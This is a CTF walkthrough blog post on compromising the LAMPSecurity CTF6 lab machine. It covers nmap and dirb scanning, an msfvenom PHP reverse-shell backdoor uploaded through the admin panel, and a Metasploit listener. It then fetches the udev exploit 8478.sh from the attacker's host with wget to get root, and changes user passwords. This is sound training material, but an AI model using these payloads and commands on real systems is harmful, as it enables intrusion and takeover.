<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">LAMPSecurity: CTF6 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/lampsecurity-ctf6-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2016-10-19T09:24:06+00:00">October 19, 2016</time><time class="updated" datetime="2025-06-10T20:12:00+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises too.</span></p>
<p><span style="color: #000000;">These exercises can be used for training purposes by following this documentation. Alternatively, you may wish to test new tools, using the CTF virtual machines as targets. This is especially helpful in evaluating the effectiveness of vulnerability discovery or penetration testing tools.</span></p>
<p><span style="color: #000000;">Download from <strong><a style="color: #000000;" href="https://www.vulnhub.com/entry/lampsecurity-ctf6,85/">Here</a></strong>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">nmap port scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Performing Directory Bruteforce</span></li>
<li><span style="color: #000000;">Exploring directories to find out the username and password</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploiting</strong></span>
<ul>
<li><span style="color: #000000;">Using a backdoor</span></li>
<li><span style="color: #000000;">Using netcat/msfconsole</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Changing the password of root and other users</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">The first step to attack is to identify the target. So, to identify the target, we will use the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YwF6fMntrFQ/XarR7xaZ9XI/AAAAAAAAg9o/x7bo4aMLQgourhX_TcucEFNkV0GWASnWACLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Now we will use nmap to gain information about the open ports and the services running on the target machine using the following command</span></p>
<pre class="lang:default decode:true">nmap -sV -sT -p- 192.168.43.30</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-y-92DyMrjQQ/XarR_FaXWDI/AAAAAAAAg-M/ASN6NmCHUAsABLxY1HiFaSQz1v_U-frRQCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore we navigated to a web browser for exploring different service. Here we have a web application so let’s explore the web application.</span></p>
<p><span style="color: #000000;"><strong>http://192.168.43.30</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-9Mmi98nQRt0/XarSBtEuzHI/AAAAAAAAg-0/0ziVsMpe5rs4tSbA9iks_m9I9Di2YzTFwCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">Further, let’s try to find some hidden files and directories. Finding files and directories can discover much useful information like username, password or some configuration files, etc. We will use the following command for the said:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.43.30</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-8d6cjnOM_Wc/XarSB83RgyI/AAAAAAAAg-4/UoJ8vM01Bks9qCPIpdvtsMr1V8D2RFiDgCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">We found two major directories i.e. /files/ and /sql/. We can tell from their names that are quite important.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-C3JpXLFvvdE/XarSBwd9KoI/AAAAAAAAg-8/kHBpT7wYIGY4roU38_t1aK6AhkFAhtpTACLcBGAsYHQ/s1600/5.png"/></p>
<p><span style="color: #000000;">Now our next step is to explore these two directories. We can also explore other directories but the rest of the directories don’t seem to be useful for us.</span></p>
<p><span style="color: #000000;"><strong>http://192.168.43.30/files/</strong></span></p>
<p><span style="color: #000000;">On exploring the files/ directory there multiple valid and useful files we found with a lot of information as you can see in the image below:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0bEYWQWzQaM/XarSCsJaP1I/AAAAAAAAg_A/HHuU2zbZ4LwLiW_xFhfv6tBUAuiYMtikQCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;"><strong>http://192.168.43.30/sql/db.sql/</strong></span></p>
<p><span style="color: #000000;">Upon traversing through sql/ directory, we found a db.sql and when opened it gave us all the information about the database including username and password just as shown in the image below:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-uQOdvZSNuWw/XarSCgDOeUI/AAAAAAAAg_E/xnfPsWLaM9w5c-I7nN2n4XXAMgPIWSzIACLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">Now let’s try to login into the admin panel using the username: ‘admin’ and password: ‘adminpass’</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-wo0abeifYNY/XarSC_RGXeI/AAAAAAAAg_I/7gJE3h5DsBYCVnRD5izK1Hqb6v6DS34ZACLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">We succeed in login. Now we have the admin panel from where we can manage the web application. Let’s see if we can add some more pages to the application so that we can upload a PHP backdoor.</span></p>
<p><span style="color: #000000;">As we can add a new event, so, here we will create a backdoor using msfvenom first and then we will upload this shell.php file on the website. To create the shell type:</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp -o /root/Music/shell.php lport=4444 lhost=192.168.43.248</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TZWsCPpWuds/XarR74XoCyI/AAAAAAAAg9g/I7J0RPmPfb8RAtBvkmsi9LG_h2KSuwrdACLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">After this, upload the shell by adding a new event as shown in the image below:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-jt6V_YlXRpA/XarR76vNJVI/AAAAAAAAg9k/_VFk2j7p_E4hh_DFIsacvkz10JtRPWCPgCLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Finally, we have uploaded a malicious file. Now we will use msfconsole or we can also use netcat to get a session in order to perform more operations to gain root access.</span></p>
<p><span style="color: #000000;">So, to access the ‘shell.php’ we will explore the directory URL: http://192.168.43.30/files/</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ku9-ddbafRA/XarR8tv6ASI/AAAAAAAAg9s/B2KsiZtxkNQt3iw9ya3Nd8YwQcybOwciwCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">Now let’s fire up the msfconsole and we have to type in these commands in msfconsole to get a session</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set lhost 192.168.43.248
msf5 exploit(multi/handler) &gt; set lport 4444
msf5 exploit(multi/handler) &gt; exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ySFEMXzuJ58/XarR89xHWZI/AAAAAAAAg9w/sDhnCuD_T5UAl0HyIXUqSWLfO0odqdBGACLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">Press enter after typing ‘exploit’ and go back to the URL: http://192.168.43.30/files/</span></p>
<p><span style="color: #000000;">And click on ‘shell.php’ and then come back to the msfconsole, now we can see we have got a session.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5LWGAPpuCtk/XarR80ms3eI/AAAAAAAAg90/9aQKq50ymYUBxhAhpouXS8NJUdvhwXERwCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">Now we have a session, so let’s run the command ‘sysinfo’ to find out some information related to kernel version and its architecture.</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-296C33VkJwM/XarR9btJbAI/AAAAAAAAg98/iDWio4NSUb4Iw1BEoEW2joPtAWlxfL9ggCLcBGAsYHQ/s1600/15.png"/></p>
<p><strong><span style="color: #000000;">Kernel version is 2.6.18-92.el5 .</span></strong></p>
<p><span style="color: #000000;">We have to search a lot to know more about this kernel version and after doing a lot of research we find out that this kernel version is vulnerable to udev exploit.</span></p>
<p><span style="color: #000000;">Now, we will use a script to gain root access, script name is 8478.sh, we can find this exploit/code in our Kali Linux OS.</span></p>
<p><span style="color: #000000;">Let’s copy this file from our OS to the directory where we have created our backdoor that is /root/Music using the cp command:</span></p>
<pre class="lang:default decode:true">cp /usr/share/exploitdb/exploits/linux/local/8478.sh /root/Music
cd /root/Music/
ls -l</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pve2vjtHRvs/XarR9Tj7tmI/AAAAAAAAg94/to6x0yqo70Q51UetxMKqiOZTP6cYfHKdACLcBGAsYHQ/s1600/16.png"/></p>
<p><span style="color: #000000;">Now, let’s run a simple HTTP Server using python so that we can download this file in our targeted system.</span></p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-aEugo5CLoFY/XarR9pkzMaI/AAAAAAAAg-A/Jvg3NcnTopkTXQ8zM9mBYLI9hn_dpvswQCLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">Now let’s drop a shell in our targeted system using the same meterpreter session</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-X-dFwJQKUqs/XarR-XDEuaI/AAAAAAAAg-E/0B-93wEZgt4HhnX3Nw3pGj075M7RfROXACLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">This is a very limited shell. using this shell, we can’t do privilege escalation. Now for gaining a more advance shell, we will use python’s pty module using the following command</span></p>
<pre class="lang:default decode:true">python -c 'import pty; pty.spawn("/bin/bash")'</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-l89S-eU2eAE/XarR-tSceII/AAAAAAAAg-I/AymQ9zvNCCs-DDcmlFAa08gNGUaQRApnQCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Now we have a shell where we can try different commands to gain root access. First of all, let’s change the directory to /tmp using the cd command</span></p>
<pre class="lang:default decode:true">cd /tmp
pwd</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-VAdf6lGe1co/XarR_GmfT8I/AAAAAAAAg-Q/7EpU9i-i-oExxncviuxSVDvsNW_A7Dl5ACLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">Now we have to download 8478.sh file here so that we can exploit the system. We can download the file using wget command:</span></p>
<pre class="lang:default decode:true">wget http://192.168.43.248:8000/8478.sh -q</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-8e4CElav4Gk/XarR_fOOM5I/AAAAAAAAg-U/zfvt4oh-sXAtqq4do7Sb8J1DondljkjEgCLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">Now change the permissions to executable using the chmod command:</span></p>
<pre class="lang:default decode:true">ls
chmod +x 8478.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4uupT_HfddA/XarR_5QP_GI/AAAAAAAAg-Y/CKx1L_w0cPML9J7wNeNud0U1QIOo-y7zQCLcBGAsYHQ/s320/22.png"/></p>
<p><span style="color: #000000;">It’s time to run the script and gain the root access, run the script using ‘./8478.sh’</span></p>
<pre class="lang:default decode:true">./8478.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-dkslUvfEmnQ/XarSAImg58I/AAAAAAAAg-c/lbCoZXRE9102j3G6FEl6CuY9AudHxxoIgCLcBGAsYHQ/s1600/23.png"/></p>
<p><span style="color: #000000;">Many of us will get this error. We will search for this error and finally, we have found a solution to this error we can resolve this issue using the following command:</span></p>
<pre class="lang:default decode:true">sed -i -e 's/\r$//' 8478.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Lh5P4Vvo4fQ/XarSAodnhMI/AAAAAAAAg-k/Hfejxz-dAYQnWXGrNl_-c2kRY8-oCfF5QCLcBGAsYHQ/s1600/24.png"/></p>
<p><span style="color: #000000;">Try again to run the script using:</span></p>
<pre class="lang:default decode:true">./8478.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-cL93l9p0fEg/XarSARU9XLI/AAAAAAAAg-g/LdeZlyggF1Qlp5xCkXmhuVBUaFbTtBKfACLcBGAsYHQ/s1600/25.png"/></p>
<p><span style="color: #000000;">The reason behind this error is, it requires some experimentation as you have to provide the proper PID to the script in order for the code to work. So now we have to find a proper PID and with the help of that PID, we will run the script. To get the PID run the following command:</span></p>
<pre class="lang:default decode:true">cat /proc/net/netlink</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ntlXEdp58-w/XarSA5g_X2I/AAAAAAAAg-o/nOLlyDWcWOMgZKj2E35BnyPoyk6f4gr8gCLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">Run the script again using the PID 376 using the command below:</span></p>
<pre class="lang:default decode:true">./8478.sh 376
whoami</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-8KUgIueJObI/XarSA7-voNI/AAAAAAAAg-s/8YEbtaZPUY0IQvweP2Htsc3Px2pCGniuQCLcBGAsYHQ/s1600/27.png"/></p>
<p><span style="color: #000000;">Boom! We have gained the root access!</span></p>
<p><span style="color: #000000;">Let’s do some more operations. Head into the /home directory using command cd /home. In the home directory, we have to find out more users. As we are root, we can change any user password using the command passwd john similarly we can change the root password using the same command.</span></p>
<pre class="lang:default decode:true">passwd root
id
su john
su -l
ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-M_PzcNKLKNU/XarSBT3D09I/AAAAAAAAg-w/_p9WQXOcpvwkFQayg5NCALH7BrUjAq8XwCLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;"><strong>Author: Yash Saxena </strong>an undergraduate student pursuing B. Tech in Computer science and engineering with a specialization in cybersecurity and forensics from DIT University, Dehradun.<strong> Contact <a style="color: #000000;" href="https://www.linkedin.com/in/yash-saxena-412349161/">here</a></strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
